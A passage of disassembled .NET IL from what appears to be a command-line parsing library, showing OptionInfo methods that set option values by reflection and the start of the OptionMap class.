    IL_0020:  br         IL_007c

    .try
    {
      IL_0025:  ldarg.0
      IL_0026:  ldfld      object CommandLine.OptionInfo::_setValueLock
      IL_002b:  dup
      IL_002c:  stloc.3
      IL_002d:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0032:  ldloc.1
        IL_0033:  ldarg.1
        IL_0034:  ldloc.2
        IL_0035:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IList`1<string>::get_Item(int32)
        IL_003a:  ldloc.0
        IL_003b:  call       class [mscorlib]System.Threading.Thread [mscorlib]System.Threading.Thread::get_CurrentThread()
        IL_0040:  callvirt   instance class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Threading.Thread::get_CurrentCulture()
        IL_0045:  call       object [mscorlib]System.Convert::ChangeType(object,
                                                                         class [mscorlib]System.Type,
                                                                         class [mscorlib]System.IFormatProvider)
        IL_004a:  ldloc.2
        IL_004b:  callvirt   instance void [mscorlib]System.Array::SetValue(object,
                                                                            int32)
        IL_0050:  ldarg.0
        IL_0051:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_0056:  ldarg.2
        IL_0057:  ldloc.1
        IL_0058:  ldnull
        IL_0059:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                              object,
                                                                                              object[])
        IL_005e:  leave      IL_006a

      }  // end .try
      finally
      {
        IL_0063:  ldloc.3
        IL_0064:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0069:  endfinally
      }  // end handler
      IL_006a:  leave      IL_0078

    }  // end .try
    catch [mscorlib]System.FormatException 
    {
      IL_006f:  pop
      IL_0070:  ldc.i4.0
      IL_0071:  stloc.s    V_4
      IL_0073:  leave      IL_0087

    }  // end handler
    IL_0078:  ldloc.2
    IL_0079:  ldc.i4.1
    IL_007a:  add
    IL_007b:  stloc.2
    IL_007c:  ldloc.2
    IL_007d:  ldloc.1
    IL_007e:  callvirt   instance int32 [mscorlib]System.Array::get_Length()
    IL_0083:  blt.s      IL_0025

    IL_0085:  ldc.i4.1
    IL_0086:  ret

    IL_0087:  ldloc.s    V_4
    IL_0089:  ret
  } // end of method OptionInfo::SetValue

  .method private hidebysig instance bool 
          SetValueScalar(string 'value',
                         object options) cil managed
  {
    // Code size       175 (0xaf)
    .maxstack  14
    .locals init ([0] object V_0,
             [1] object V_1,
             [2] bool V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
      IL_0006:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
      IL_000b:  callvirt   instance bool [mscorlib]System.Type::get_IsEnum()
      IL_0010:  brfalse    IL_004d

      IL_0015:  ldarg.0
      IL_0016:  ldfld      object CommandLine.OptionInfo::_setValueLock
      IL_001b:  dup
      IL_001c:  stloc.0
      IL_001d:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0022:  ldarg.0
        IL_0023:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_0028:  ldarg.2
        IL_0029:  ldarg.0
        IL_002a:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_002f:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
        IL_0034:  ldarg.1
        IL_0035:  ldc.i4.1
        IL_0036:  call       object [mscorlib]System.Enum::Parse(class [mscorlib]System.Type,
                                                                 string,
                                                                 bool)
        IL_003b:  ldnull
        IL_003c:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                              object,
                                                                                              object[])
        IL_0041:  leave      IL_008e

      }  // end .try
      finally
      {
        IL_0046:  ldloc.0
        IL_0047:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_004c:  endfinally
      }  // end handler
      IL_004d:  ldarg.0
      IL_004e:  ldfld      object CommandLine.OptionInfo::_setValueLock
      IL_0053:  dup
      IL_0054:  stloc.1
      IL_0055:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_005a:  ldarg.0
        IL_005b:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_0060:  ldarg.2
        IL_0061:  ldarg.1
        IL_0062:  ldarg.0
        IL_0063:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_0068:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
        IL_006d:  call       class [mscorlib]System.Threading.Thread [mscorlib]System.Threading.Thread::get_CurrentThread()
        IL_0072:  callvirt   instance class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Threading.Thread::get_CurrentCulture()
        IL_0077:  call       object [mscorlib]System.Convert::ChangeType(object,
                                                                         class [mscorlib]System.Type,
                                                                         class [mscorlib]System.IFormatProvider)
        IL_007c:  ldnull
        IL_007d:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                              object,
                                                                                              object[])
        IL_0082:  leave      IL_008e

      }  // end .try
      finally
      {
        IL_0087:  ldloc.1
        IL_0088:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008d:  endfinally
      }  // end handler
      IL_008e:  leave      IL_00ab

    }  // end .try
    catch [mscorlib]System.InvalidCastException 
    {
      IL_0093:  pop
      IL_0094:  ldc.i4.0
      IL_0095:  stloc.2
      IL_0096:  leave      IL_00ad

    }  // end handler
    catch [mscorlib]System.FormatException 
    {
      IL_009b:  pop
      IL_009c:  ldc.i4.0
      IL_009d:  stloc.2
      IL_009e:  leave      IL_00ad

    }  // end handler
    catch [mscorlib]System.ArgumentException 
    {
      IL_00a3:  pop
      IL_00a4:  ldc.i4.0
      IL_00a5:  stloc.2
      IL_00a6:  leave      IL_00ad

    }  // end handler
    IL_00ab:  ldc.i4.1
    IL_00ac:  ret

    IL_00ad:  ldloc.2
    IL_00ae:  ret
  } // end of method OptionInfo::SetValueScalar

  .method private hidebysig instance bool 
          SetNullableValue(string 'value',
                           object options) cil managed
  {
    // Code size       90 (0x5a)
    .maxstack  11
    .locals init ([0] class [System]System.ComponentModel.NullableConverter V_0,
             [1] object V_1,
             [2] bool V_2)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_0006:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
    IL_000b:  newobj     instance void [System]System.ComponentModel.NullableConverter::.ctor(class [mscorlib]System.Type)
    IL_0010:  stloc.0
    .try
    {
      IL_0011:  ldarg.0
      IL_0012:  ldfld      object CommandLine.OptionInfo::_setValueLock
      IL_0017:  dup
      IL_0018:  stloc.1
      IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001e:  ldarg.0
        IL_001f:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_0024:  ldarg.2
        IL_0025:  ldloc.0
        IL_0026:  ldnull
        IL_0027:  call       class [mscorlib]System.Threading.Thread [mscorlib]System.Threading.Thread::get_CurrentThread()
        IL_002c:  callvirt   instance class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Threading.Thread::get_CurrentCulture()
        IL_0031:  ldarg.1
        IL_0032:  callvirt   instance object [System]System.ComponentModel.TypeConverter::ConvertFromString(class [System]System.ComponentModel.ITypeDescriptorContext,
                                                                                                            class [mscorlib]System.Globalization.CultureInfo,
                                                                                                            string)
        IL_0037:  ldnull
        IL_0038:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                              object,
                                                                                              object[])
        IL_003d:  leave      IL_0049

      }  // end .try
      finally
      {
        IL_0042:  ldloc.1
        IL_0043:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0048:  endfinally
      }  // end handler
      IL_0049:  leave      IL_0056

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_004e:  pop
      IL_004f:  ldc.i4.0
      IL_0050:  stloc.2
      IL_0051:  leave      IL_0058

    }  // end handler
    IL_0056:  ldc.i4.1
    IL_0057:  ret

    IL_0058:  ldloc.2
    IL_0059:  ret
  } // end of method OptionInfo::SetNullableValue

  .method public hidebysig instance bool 
          SetValue(bool 'value',
                   object options) cil managed
  {
    // Code size       48 (0x30)
    .maxstack  5
    .locals init ([0] object V_0,
             [1] bool V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object CommandLine.OptionInfo::_setValueLock
    IL_0006:  dup
    IL_0007:  stloc.0
    IL_0008:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      IL_000d:  ldarg.0
      IL_000e:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
      IL_0013:  ldarg.2
      IL_0014:  ldarg.1
      IL_0015:  box        [mscorlib]System.Boolean
      IL_001a:  ldnull
      IL_001b:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                            object,
                                                                                            object[])
      IL_0020:  ldc.i4.1
      IL_0021:  stloc.1
      IL_0022:  leave      IL_002e

    }  // end .try
    finally
    {
      IL_0027:  ldloc.0
      IL_0028:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_002d:  endfinally
    }  // end handler
    IL_002e:  ldloc.1
    IL_002f:  ret
  } // end of method OptionInfo::SetValue

  .method private hidebysig instance bool 
          SetValueList(string 'value',
                       object options) cil managed
  {
    // Code size       137 (0x89)
    .maxstack  12
    .locals init ([0] object V_0,
             [1] class [mscorlib]System.Collections.Generic.IList`1<string> V_1,
             [2] char[] V_2,
             [3] string[] V_3,
             [4] int32 V_4,
             [5] bool V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object CommandLine.OptionInfo::_setValueLock
    IL_0006:  dup
    IL_0007:  stloc.0
    IL_0008:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      IL_000d:  ldarg.0
      IL_000e:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
      IL_0013:  ldarg.2
      IL_0014:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
      IL_0019:  ldnull
      IL_001a:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                            object,
                                                                                            object[])
      IL_001f:  ldarg.0
      IL_0020:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
      IL_0025:  ldarg.2
      IL_0026:  ldnull
      IL_0027:  callvirt   instance object [mscorlib]System.Reflection.PropertyInfo::GetValue(object,
                                                                                              object[])
      IL_002c:  castclass  class [mscorlib]System.Collections.Generic.IList`1<string>
      IL_0031:  stloc.1
      IL_0032:  ldarg.1
      IL_0033:  ldc.i4.1
      IL_0034:  newarr     [mscorlib]System.Char
      IL_0039:  stloc.2
      IL_003a:  ldloc.2
      IL_003b:  ldc.i4.0
      IL_003c:  ldarg.0
      IL_003d:  ldfld      class CommandLine.OptionAttribute CommandLine.OptionInfo::_attribute
      IL_0042:  castclass  CommandLine.OptionListAttribute
      IL_0047:  callvirt   instance char CommandLine.OptionListAttribute::get_Separator()
      IL_004c:  stelem.i2
      IL_004d:  ldloc.2
      IL_004e:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
      IL_0053:  stloc.3
      IL_0054:  ldc.i4.0
      IL_0055:  stloc.s    V_4
      IL_0057:  br         IL_0070

      IL_005c:  ldloc.1
      IL_005d:  ldloc.3
      IL_005e:  ldloc.s    V_4
      IL_0060:  ldelem     [mscorlib]System.String
      IL_0065:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<string>::Add(!0)
      IL_006a:  ldloc.s    V_4
      IL_006c:  ldc.i4.1
      IL_006d:  add
      IL_006e:  stloc.s    V_4
      IL_0070:  ldloc.s    V_4
      IL_0072:  ldloc.3
      IL_0073:  ldlen
      IL_0074:  conv.i4
      IL_0075:  blt.s      IL_005c

      IL_0077:  ldc.i4.1
      IL_0078:  stloc.s    V_5
      IL_007a:  leave      IL_0086

    }  // end .try
    finally
    {
      IL_007f:  ldloc.0
      IL_0080:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0085:  endfinally
    }  // end handler
    IL_0086:  ldloc.s    V_5
    IL_0088:  ret
  } // end of method OptionInfo::SetValueList

  .method public hidebysig instance void 
          SetDefault(object options) cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init ([0] object V_0,
             [1] class [mscorlib]System.Exception V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.OptionInfo::_hasDefaultValue
    IL_0006:  brfalse    IL_0049

    IL_000b:  ldarg.0
    IL_000c:  ldfld      object CommandLine.OptionInfo::_setValueLock
    IL_0011:  dup
    IL_0012:  stloc.0
    IL_0013:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_0018:  ldarg.0
        IL_0019:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
        IL_001e:  ldarg.1
        IL_001f:  ldarg.0
        IL_0020:  ldfld      object CommandLine.OptionInfo::_defaultValue
        IL_0025:  ldnull
        IL_0026:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                              object,
                                                                                              object[])
        IL_002b:  leave      IL_003d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0030:  stloc.1
        IL_0031:  ldstr      "Bad default value."
        IL_0036:  ldloc.1
        IL_0037:  newobj     instance void CommandLine.CommandLineParserException::.ctor(string,
                                                                                         class [mscorlib]System.Exception)
        IL_003c:  throw

      }  // end handler
      IL_003d:  leave      IL_0049

    }  // end .try
    finally
    {
      IL_0042:  ldloc.0
      IL_0043:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0048:  endfinally
    }  // end handler
    IL_0049:  ret
  } // end of method OptionInfo::SetDefault

  .method public hidebysig specialname instance string 
          get_ShortName() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_shortName
    IL_0006:  ret
  } // end of method OptionInfo::get_ShortName

  .method public hidebysig specialname instance string 
          get_LongName() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_longName
    IL_0006:  ret
  } // end of method OptionInfo::get_LongName

  .method assembly hidebysig specialname 
          instance string  get_NameWithSwitch() cil managed
  {
    // Code size       45 (0x2d)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_longName
    IL_0006:  brfalse    IL_001c

    IL_000b:  ldstr      "--"
    IL_0010:  ldarg.0
    IL_0011:  ldfld      string CommandLine.OptionInfo::_longName
    IL_0016:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_001b:  ret

    IL_001c:  ldstr      "-"
    IL_0021:  ldarg.0
    IL_0022:  ldfld      string CommandLine.OptionInfo::_shortName
    IL_0027:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002c:  ret
  } // end of method OptionInfo::get_NameWithSwitch

  .method public hidebysig specialname instance string 
          get_MutuallyExclusiveSet() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_mutuallyExclusiveSet
    IL_0006:  ret
  } // end of method OptionInfo::get_MutuallyExclusiveSet

  .method public hidebysig specialname instance bool 
          get_Required() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.OptionInfo::_required
    IL_0006:  ret
  } // end of method OptionInfo::get_Required

  .method public hidebysig specialname instance string 
          get_HelpText() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_helpText
    IL_0006:  ret
  } // end of method OptionInfo::get_HelpText

  .method public hidebysig specialname instance bool 
          get_IsBoolean() cil managed
  {
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_0006:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
    IL_000b:  ldtoken    [mscorlib]System.Boolean
    IL_0010:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0015:  ceq
    IL_0017:  ret
  } // end of method OptionInfo::get_IsBoolean

  .method public hidebysig specialname instance bool 
          get_IsArray() cil managed
  {
    // Code size       17 (0x11)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Reflection.PropertyInfo CommandLine.OptionInfo::_property
    IL_0006:  callvirt   instance class [mscorlib]System.Type [mscorlib]System.Reflection.PropertyInfo::get_PropertyType()
    IL_000b:  callvirt   instance bool [mscorlib]System.Type::get_IsArray()
    IL_0010:  ret
  } // end of method OptionInfo::get_IsArray

  .method public hidebysig specialname instance bool 
          get_IsAttributeArrayCompatible() cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.OptionAttribute CommandLine.OptionInfo::_attribute
    IL_0006:  isinst     CommandLine.OptionArrayAttribute
    IL_000b:  ldnull
    IL_000c:  cgt.un
    IL_000e:  ret
  } // end of method OptionInfo::get_IsAttributeArrayCompatible

  .method public hidebysig specialname instance bool 
          get_IsDefined() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.OptionInfo::'<IsDefined>k__BackingField'
    IL_0006:  ret
  } // end of method OptionInfo::get_IsDefined

  .method public hidebysig specialname instance void 
          set_IsDefined(bool 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.OptionInfo::'<IsDefined>k__BackingField'
    IL_0007:  ret
  } // end of method OptionInfo::set_IsDefined

  .method public hidebysig specialname instance bool 
          get_HasBothNames() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.OptionInfo::_shortName
    IL_0006:  brfalse    IL_0018

    IL_000b:  ldarg.0
    IL_000c:  ldfld      string CommandLine.OptionInfo::_longName
    IL_0011:  ldnull
    IL_0012:  ceq
    IL_0014:  ldc.i4.0
    IL_0015:  ceq
    IL_0017:  ret

    IL_0018:  ldc.i4.0
    IL_0019:  ret
  } // end of method OptionInfo::get_HasBothNames

  .property instance string ShortName()
  {
    .get instance string CommandLine.OptionInfo::get_ShortName()
  } // end of property OptionInfo::ShortName
  .property instance string LongName()
  {
    .get instance string CommandLine.OptionInfo::get_LongName()
  } // end of property OptionInfo::LongName
  .property instance string NameWithSwitch()
  {
    .get instance string CommandLine.OptionInfo::get_NameWithSwitch()
  } // end of property OptionInfo::NameWithSwitch
  .property instance string MutuallyExclusiveSet()
  {
    .get instance string CommandLine.OptionInfo::get_MutuallyExclusiveSet()
  } // end of property OptionInfo::MutuallyExclusiveSet
  .property instance bool Required()
  {
    .get instance bool CommandLine.OptionInfo::get_Required()
  } // end of property OptionInfo::Required
  .property instance string HelpText()
  {
    .get instance string CommandLine.OptionInfo::get_HelpText()
  } // end of property OptionInfo::HelpText
  .property instance bool IsBoolean()
  {
    .get instance bool CommandLine.OptionInfo::get_IsBoolean()
  } // end of property OptionInfo::IsBoolean
  .property instance bool IsArray()
  {
    .get instance bool CommandLine.OptionInfo::get_IsArray()
  } // end of property OptionInfo::IsArray
  .property instance bool IsAttributeArrayCompatible()
  {
    .get instance bool CommandLine.OptionInfo::get_IsAttributeArrayCompatible()
  } // end of property OptionInfo::IsAttributeArrayCompatible
  .property instance bool IsDefined()
  {
    .get instance bool CommandLine.OptionInfo::get_IsDefined()
    .set instance void CommandLine.OptionInfo::set_IsDefined(bool)
  } // end of property OptionInfo::IsDefined
  .property instance bool HasBothNames()
  {
    .get instance bool CommandLine.OptionInfo::get_HasBothNames()
  } // end of property OptionInfo::HasBothNames
} // end of class CommandLine.OptionInfo

.class private auto ansi sealed beforefieldinit CommandLine.OptionMap
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Reflection.DefaultMemberAttribute::.ctor(string) = ( 01 00 04 49 74 65 6D 00 00 )                      // ...Item..
  .class auto ansi sealed nested private beforefieldinit MutuallyExclusiveInfo
         extends [mscorlib]System.Object
  {
    .field private int32 _count
    .field private class CommandLine.OptionInfo '<BadOption>k__BackingField'
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .method public hidebysig specialname rtspecialname 
            instance void  .ctor(class CommandLine.OptionInfo option) cil managed
    {
      // Code size       14 (0xe)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldarg.1
      IL_0008:  call       instance void CommandLine.OptionMap/MutuallyExclusiveInfo::set_BadOption(class CommandLine.OptionInfo)
      IL_000d:  ret
    } // end of method MutuallyExclusiveInfo::.ctor

    .method public hidebysig specialname 
            instance class CommandLine.OptionInfo 
            get_BadOption() cil managed
    {
      .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class CommandLine.OptionInfo CommandLine.OptionMap/MutuallyExclusiveInfo::'<BadOption>k__BackingField'
      IL_0006:  ret
    } // end of method MutuallyExclusiveInfo::get_BadOption

    .method private hidebysig specialname 
            instance void  set_BadOption(class CommandLine.OptionInfo 'value') cil managed
    {
      .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  stfld      class CommandLine.OptionInfo CommandLine.OptionMap/MutuallyExclusiveInfo::'<BadOption>k__BackingField'
      IL_0007:  ret
    } // end of method MutuallyExclusiveInfo::set_BadOption

    .method public hidebysig instance void 
            IncrementOccurrence() cil managed
    {
      // Code size       15 (0xf)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  dup
      IL_0002:  ldfld      int32 CommandLine.OptionMap/MutuallyExclusiveInfo::_count
      IL_0007:  ldc.i4.1
      IL_0008:  add
      IL_0009:  stfld      int32 CommandLine.OptionMap/MutuallyExclusiveInfo::_count
      IL_000e:  ret
    } // end of method MutuallyExclusiveInfo::IncrementOccurrence

    .method public hidebysig specialname 
            instance int32  get_Occurrence() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldfld      int32 CommandLine.OptionMap/MutuallyExclusiveInfo::_count
      IL_0006:  ret
    } // end of method MutuallyExclusiveInfo::get_Occurrence

    .property instance class CommandLine.OptionInfo
            BadOption()
    {
      .get instance class CommandLine.OptionInfo CommandLine.OptionMap/MutuallyExclusiveInfo::get_BadOption()
      .set instance void CommandLine.OptionMap/MutuallyExclusiveInfo::set_BadOption(class CommandLine.OptionInfo)
    } // end of property MutuallyExclusiveInfo::BadOption
    .property instance int32 Occurrence()
    {
      .get instance int32 CommandLine.OptionMap/MutuallyExclusiveInfo::get_Occurrence()
    } // end of property MutuallyExclusiveInfo::Occurrence
  } // end of class MutuallyExclusiveInfo

  .field private initonly class CommandLine.CommandLineParserSettings _settings
  .field private initonly class [mscorlib]System.Collections.Generic.Dictionary`2<string,string> _names
  .field private initonly class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> _map
  .field private initonly class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> _mutuallyExclusiveSetMap
  .field private object '<RawOptions>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(int32 capacity,
                               class CommandLine.CommandLineParserSettings settings) cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.Collections.Generic.IEqualityComparer`1<string> V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.2
    IL_0008:  stfld      class CommandLine.CommandLineParserSettings CommandLine.OptionMap::_settings
    IL_000d:  ldarg.0
    IL_000e:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.OptionMap::_settings
    IL_0013:  callvirt   instance bool CommandLine.CommandLineParserSettings::get_CaseSensitive()
    IL_0018:  brfalse    IL_0028

    IL_001d:  call       class [mscorlib]System.StringComparer [mscorlib]System.StringComparer::get_Ordinal()
    IL_0022:  stloc.0
    IL_0023:  br         IL_002e

    IL_0028:  call       class [mscorlib]System.StringComparer [mscorlib]System.StringComparer::get_OrdinalIgnoreCase()
    IL_002d:  stloc.0
    IL_002e:  ldarg.0
    IL_002f:  ldarg.1
    IL_0030:  ldloc.0
    IL_0031:  newobj     instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,string>::.ctor(int32,
                                                                                                                     class [mscorlib]System.Collections.Generic.IEqualityComparer`1<!0>)
    IL_0036:  stfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,string> CommandLine.OptionMap::_names
    IL_003b:  ldarg.0
    IL_003c:  ldarg.1
    IL_003d:  ldc.i4.2
    IL_003e:  mul
    IL_003f:  ldloc.0
    IL_0040:  newobj     instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::.ctor(int32,
                                                                                                                                           class [mscorlib]System.Collections.Generic.IEqualityComparer`1<!0>)
    IL_0045:  stfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_004a:  ldarg.0
    IL_004b:  ldfld      class CommandLine.CommandLineParserSettings CommandLine.OptionMap::_settings
    IL_0050:  callvirt   instance bool CommandLine.CommandLineParserSettings::get_MutuallyExclusive()
    IL_0055:  brfalse    IL_006b

    IL_005a:  ldarg.0
    IL_005b:  ldarg.1
    IL_005c:  call       class [mscorlib]System.StringComparer [mscorlib]System.StringComparer::get_OrdinalIgnoreCase()
    IL_0061:  newobj     instance void class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo>::.ctor(int32,
                                                                                                                                                                class [mscorlib]System.Collections.Generic.IEqualityComparer`1<!0>)
    IL_0066:  stfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionMap/MutuallyExclusiveInfo> CommandLine.OptionMap::_mutuallyExclusiveSetMap
    IL_006b:  ret
  } // end of method OptionMap::.ctor

  .method public hidebysig specialname instance class CommandLine.OptionInfo 
          get_Item(string key) cil managed
  {
    // Code size       82 (0x52)
    .maxstack  8
    .locals init ([0] class CommandLine.OptionInfo V_0,
             [1] string V_1)
    IL_0000:  ldnull
    IL_0001:  stloc.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0008:  ldarg.1
    IL_0009:  callvirt   instance bool class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::ContainsKey(!0)
    IL_000e:  brfalse    IL_0025

    IL_0013:  ldarg.0
    IL_0014:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0019:  ldarg.1
    IL_001a:  callvirt   instance !1 class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::get_Item(!0)
    IL_001f:  stloc.0
    IL_0020:  br         IL_0050

    IL_0025:  ldarg.0
    IL_0026:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,string> CommandLine.OptionMap::_names
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance bool class [mscorlib]System.Collections.Generic.Dictionary`2<string,string>::ContainsKey(!0)
    IL_0031:  brfalse    IL_0050

    IL_0036:  ldarg.0
    IL_0037:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,string> CommandLine.OptionMap::_names
    IL_003c:  ldarg.1
    IL_003d:  callvirt   instance !1 class [mscorlib]System.Collections.Generic.Dictionary`2<string,string>::get_Item(!0)
    IL_0042:  stloc.1
    IL_0043:  ldarg.0
    IL_0044:  ldfld      class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo> CommandLine.OptionMap::_map
    IL_0049:  ldloc.1
    IL_004a:  callvirt   instance !1 class [mscorlib]System.Collections.Generic.Dictionary`2<string,class CommandLine.OptionInfo>::get_Item(!0)
    IL_004f:  stloc.0
